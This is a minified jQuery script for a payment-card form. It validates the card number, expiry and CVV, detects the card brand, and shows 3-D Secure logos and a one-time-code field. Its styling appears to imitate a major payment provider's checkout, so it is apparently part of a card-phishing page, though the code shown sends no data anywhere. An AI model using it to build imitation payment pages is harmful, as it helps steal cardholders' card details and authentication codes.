jQuery(function(){$("#Exp").mask("99/99")}),jQuery(function(){$("#Cvv").mask("9999")}),$(document).ready(function(){$("#btnConfirm").click(function(){var a,b=$("#Name").val(),c=$("#Number").val(),d=$("#Exp").val(),e=$("#Cvv").val();return(""===b&&(a=!1,document.getElementById("DivName").className="textInput lap hasError"),(""===c||15>c.length)&&(a=!1,document.getElementById("DivNumber").className="textInput ccNumber ccNumber ccNum lap hasError",document.getElementById("DivLogo").className="fiModule-icon_card hide"),""===d&&(a=!1,document.getElementById("DivExp").className="textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError"),(""===e||3>e.length)&&(a=!1,document.getElementById("DivCvv").className="textInput csc pull-right csc securityCode lap hasError"),!1!==a)&&(document.getElementById("xcard").innerHTML="x-"+c.substr(-4),document.getElementById("loading").className="hasSpinner",!0)}),$("#Name").keyup(function(){document.getElementById("DivName").className=""===$(this).val().length?"textInput lap hasError":"textInput lap"}),$("#Number").keyup(function(){"textInput ccNumber ccNumber ccNum lap hasError"==document.getElementById("DivNumber").className||0!==$(this).val().length?document.getElementById("DivNumber").className="textInput ccNumber ccNumber ccNum lap":(document.getElementById("DivNumber").className="textInput ccNumber ccNumber ccNum lap hasError",document.getElementById("DivLogo").className="fiModule-icon_card hide",$("#DivCvv").attr("data-ctype","")),4==$(this).val().substring(0,1)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-visa-logo",document.getElementById("secureLogo").src="../assets/img/3dsecure/vbv.png",$("#DivCvv").attr("data-ctype",""),jQuery(function(){$("#Number").mask("9999 9999 9999 9999")})),5==$(this).val().substring(0,1)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-mastercard-logo",document.getElementById("secureLogo").src="../assets/img/3dsecure/mcsc.png",$("#DivCvv").attr("data-ctype",""),jQuery(function(){$("#Number").mask("9999 9999 9999 9999")})),34==$(this).val().substring(0,2)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-amex-logo",document.getElementById("secureLogo").src="../assets/img/3dsecure/safekey.png",document.getElementById("Otp").placeholder="Amex CID",$("#DivCvv").attr("data-ctype","amex"),jQuery(function(){$("#Number").mask("9999 999999 99999")})),37==$(this).val().substring(0,2)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-amex-logo",document.getElementById("secureLogo").src="../assets/img/3dsecure/safekey.png",document.getElementById("Otp").placeholder="Amex CID",$("#DivCvv").attr("data-ctype","amex"),jQuery(function(){$("#Number").mask("9999 999999 99999")})),35==$(this).val().substring(0,2)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-jcb-logo",document.getElementById("secureLogo").src="../assets/img/3dsecure/jcb.png",$("#DivCvv").attr("data-ctype",""),jQuery(function(){$("#Number").mask("9999 9999 9999 9999")})),60==$(this).val().substring(0,2)&&(document.getElementById("DivLogo").className="fiModule-icon_card fiModule-discover-logo",$("#DivCvv").attr("data-ctype",""),jQuery(function(){$("#Number").mask("9999 9999 9999 9999")}))}),$("#Exp").keyup(function(){var a=document.getElementById("DivExp").className;document.getElementById("DivExp").className="textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError"==a||0!==$(this).val().length?"textInput expirationDate js_expirationDate expirationDate expirationDate lap":"textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError"}),$("#Cvv").keyup(function(){var a=document.getElementById("DivCvv").className;document.getElementById("DivCvv").className="textInput csc pull-right csc securityCode lap hasError"==a||0!==$(this).val().length?"textInput csc pull-right csc securityCode lap":"textInput csc pull-right csc securityCode lap hasError"})});
